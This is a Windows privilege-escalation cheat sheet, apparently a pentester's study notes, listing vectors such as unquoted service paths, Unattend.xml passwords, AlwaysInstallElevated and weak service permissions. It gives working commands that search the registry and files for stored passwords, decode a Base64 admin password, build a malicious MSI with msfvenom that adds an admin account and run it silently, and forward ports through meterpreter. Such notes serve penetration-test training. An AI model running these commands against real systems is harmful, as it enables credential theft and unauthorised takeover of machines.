                                                      Windows priv escalation
#Common Windows Privilege Escalation Vectors

1)Stored Credentials

2)Windows Kernel Exploit

3)DLL Injection

4)Unattended Answer File

5)Insecure File/Folder Permissions

6)Insecure Service Permissions

7)DLL Hijacking

8)Group Policy Preferences

9)Unquoted Service Path

10)Always Install Elevated

11)Token Manipulation

12)Insecure Registry Permissions

13)Autologon User Credential

14)User Account Control (UAC) Bypass

15)Insecure Named Pipes Permissions

--------------------------------Links and commands-------------------------------

1)->Windows Unquoted Service Paths
Basically, it is a vulnerability that occurs if a service executable path is not enclosed with quotation marks and contains space.
To identify these unquoted services you can run this command on Windows Command Shell:
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

https://medium.com/@harshaunsingh/windows-privileged-escalation-manual-and-using-metasploit-framework-ch-1-fd5f31a7db86

------------------------------------------------------------------------------------------

2)->Unattended Installs

Unattended Installs allow for the deployment of Windows with little-to-no active involvement from an administrator.  This solution is ideal in larger organizations where it would be too labor and time-intensive to perform wide-scale deployments manually.  If administrators fail to clean up after this process, an EXtensible Markup Language (XML) file called Unattend is left on the local system.  This file contains all the configuration settings that were set during the installation process, some of which can include the configuration of local accounts, to include Administrator accounts!

While it’s a good idea to search the entire drive, Unattend files are likely to be found within the following folders:

C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\
Note: In addition to Unattend.xml files, be on the lookout for sysprep.xml and sysprep.inf files on the file system.  These files can also contain credential information utilizing during deployment of the operating system, allowing us to escalate privileges.  

Once you’ve located an Unattend file, open it up and search for the <UserAccounts> tag.  This section will define the settings for any local accounts (and sometimes even Domain accounts):

<UserAccounts>
    <LocalAccounts>
        <LocalAccount>
            <Password>
                <Value>UEBzc3dvcmQxMjMhUGFzc3dvcmQ=</Value>
                <PlainText>false</PlainText>
            </Password>
            <Description>Local Administrator</Description>
            <DisplayName>Administrator</DisplayName>
            <Group>Administrators</Group>
            <Name>Administrator</Name>
        </LocalAccount>
    </LocalAccounts>
</UserAccounts>
In the snippet of the sample Unattend file above, you can see a local account being created and added to the Administrators group.  The administrator chose not to have the password stored in plaintext; however, it is merely obfuscated with Base64.  As seen below, we can trivially decode it in Kali with the following:

echo "UEBzc3dvcmQxMjMhUGFzc3dvcmQ=" | base64 -d
base64_decode

So, our password is “P@ssword123!Password”?  Not quite…  Microsoft appends “Password” to all passwords within Unattend files before encoding them; therefore, our Local Administrator password is in fact just “P@ssword123!”.

Under the <UserAccounts> section, you may also see <AdministratorPassword> tags, which are another way to configure the Local Administrator account.
 
 --------------------------------------------------------------------------------------------------
  
3)->Raw passwords in registry
#vnc

reg query "HKCU\Software\ORL\WinVNC3\Password"

#Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

#SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

#Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

#Search for password in registry
reg query HKLM /f password /t REG_SZ /s

reg query HKCU /f password /t REG_SZ /s

---------------------------------------------------------------------------------------------
                                                       
4)->Identify hotfix or patches

systeminfo

#or
wmic qfe get Caption,Description,HotFixID,InstalledOn

post/windows/gather/enum_patches (metasploit module)

->Check what runs on startup?
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"

via powershell

Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"

->What software is installed?

dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
via powershell

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

->scheduled tasks
Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite.

schtasks /query /fo LIST /v

schtasks /query /fo LIST 2>nul | findstr TaskName

dir C:\windows\tasks

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

-----------------------------------------------------------------------------------

5)->searching for cleartext passwords

findstr /si password *.txt

findstr /si password *.xml

findstr /si password *.ini

#Find all those strings in config files.

dir /s *pass* == *cred* == *vnc* == *.config*

#Find all passwords in all files.

findstr /spin "password" *.*

findstr /spin "password" *.*

--------------------------------------------------------------------------------------
6)->Using always installed elevated configuration
http://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
https://toshellandback.com/2015/11/24/ms-priv-esc/

AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions. However, granting users this ability is a security concern because it is too easy to abuse this privilege.   For this to occur, there are two registry entries that have to be set to the value of “1” on the machine:

[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
“AlwaysInstallElevated”=dword:00000001 

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
“AlwaysInstallElevated”=dword:00000001
The easiest way to check the values of these two registry entries is to utilize the built-in command line tool, reg query:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Note:  If you happen to get an error message similar to: The system was unable to find the specified registry key or value, it may be that a Group Policy setting for AlwaysInstallElevated was never defined, and therefore an associated registry entry doesn’t exist.

Now that we know AlwaysInstallElevated is enabled for both the local machine and the current user, we can proceed to utilize MSFVenom to generate an MSI file that, when executed on the victim machine, will add a user to the Local Administrators group:

msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
Once you have our newly created MSI file loaded on the victim, we can leverage a command-line tool within Windows, Msiexec, to covertly (in the background) run the installation:

msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
The properties of the switches utilized in the above Msiexec command are below:

/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation

Once run, we can check to validate that our account was created and added to the Local Administrator Group:
->net localgroup Administrator
Note: MSI files created with MSFVenom as well as with the always_install_elevated module discussed below, will fail during installation.  This behavior is intentional and meant to prevent the installation being registered with the operating system.

Metasploit Module:  exploit/windows/local/always_install_elevated

As you can see below, this module simply requires that you link it to an existing session prior to running:

----------------------------------------------------------------------------------------
7)->Vulnerable Services

https://toshellandback.com/2015/11/24/ms-priv-esc/

Metasploit Module: exploit/windows/local/service_permissions

When discussing exploitation of Vulnerable Services, there are two objects one can be referring to:

a)Service Binaries
b)Windows Services

The former is very similar to what we did with Trusted Service Paths.  Whereas Trusted Service Paths exploits odd Windows file path interpretation in combination with folder permissions along the service path, Vulnerable Service Executables takes advantage of file/folder permissions pertaining to the actual executable itself.  If the correct permissions are in place, we can simply replace the service executable with a malicious one of our own.

The latter refers to the actual Windows Service and the ability to modify it’s properties. These Services run in the background and are controlled by the Operating System through the Service Control Manager (SCM), which issues commands to and receives updates from all Windows Services.  If we can modify a Service’s binary path (binpath) property, upon a restart of the service, we can have the Service issue a command as SYSTEM on our behalf.  Let’s take a look…

The easiest way to determine which Windows Services have vulnerable privileges is to utilize the AccessChk tool, which is part of the SysInternals Suite.  This group of tools was written for Microsoft by Mark Russinovich to allow for advanced querying, managing and troubleshooting of systems and applications.  While it’s always a good idea to limit the amount of items that you allow to touch disk during a pentesting engagement due to risk of anti-virus detection (among other concerns), since AccessChk is an official and well-known Microsoft tool, the chances of flagging any protective mechanisms on the machine are slim.

Once we have AccessChk downloaded on our target machine, GREED, we can run the following command to determine which Services can be modified by any authenticated user (regardless of privilege level):

accesschk.exe -uwcqv "Authenticated Users" * /accepteula

to check in detail visit https://toshellandback.com/2015/11/24/ms-priv-esc/

------------------------------------------------------------------------------------

8)->Are there any weak folder or file permissions?

Full Permissions for Everyone or Users on Program Folders?

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
Modify Permissions for Everyone or Users on Program Folders?

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} 
You can also upload accesschk from Sysinternals to check for writeable folders and files.

accesschk.exe -qwsu "Everyone" *
accesschk.exe -qwsu "Authenticated Users" *
accesschk.exe -qwsu "Users" *

----------------------------------------------------------------------------------------------


9)->mimikatz
extract cleartext passwords from memory

--------------------------------------------------------------------------------------

10)->llmnr/netbios poisining
use RESPONDER(Kali linux)

-------------------------------------------------------------------------------------------------

11)->priv escalation via group policy prefrences
https://www.toshellandback.com/2015/08/30/gpp/

-------------------------------------------------------------------------------------------------


12)->Service only available from inside

Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible from inside the network/machine. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside.


netstat -ano

Example output:

Proto  Local address      Remote address     State        User  Inode  PID/Program name

    -----  -------------      --------------     -----        ----  -----  ----------------
    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -
    
    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -
    
    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -
    
    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -
    
    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -
    
    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -
    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -
    '
    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -
    
    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -
    
    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -
    
    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -
    
    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -
    
    
Look for LISTENING/LISTEN. Compare that to the scan you did from the outside.
Does it contain any ports that are not accessible from the outside?
If that is the case, maybe you can make a remote forward to access it.

Port forward using plink

plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080


Port forward using meterpreter

portfwd add -l <attacker port> -p <victim port> -r <victim ip>
  
portfwd add -l 3306 -p 3306 -r 192.168.1.101
So how should we interpret the netstat output?

Local address 0.0.0.0

Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it.

Local address 127.0.0.1

Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. This is interesting to us!

Local address 192.168.1.9

Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. This is also interesting to us!

Some more very usefull links
  
  --------------------------------------------------------------------------------------------------------------

->Using kernel exploits
http://www.hackingarticles.in/windows-kernel-exploit-privilege-escalation/

->Multiple ways to Bypass uac
http://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/

->Using automated scripts
https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194

http://www.hackingarticles.in/window-privilege-escalation-via-automated-script/

Includes Sherlock,JAWS,Windows Exploit suggester, Power Up and other automated scripts.


------------------------------Some more resources---------------------------------------------------------------------------------
https://toshellandback.com/2015/11/24/ms-priv-esc/
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/


https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194

http://www.fuzzysecurity.com/tutorials/16.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
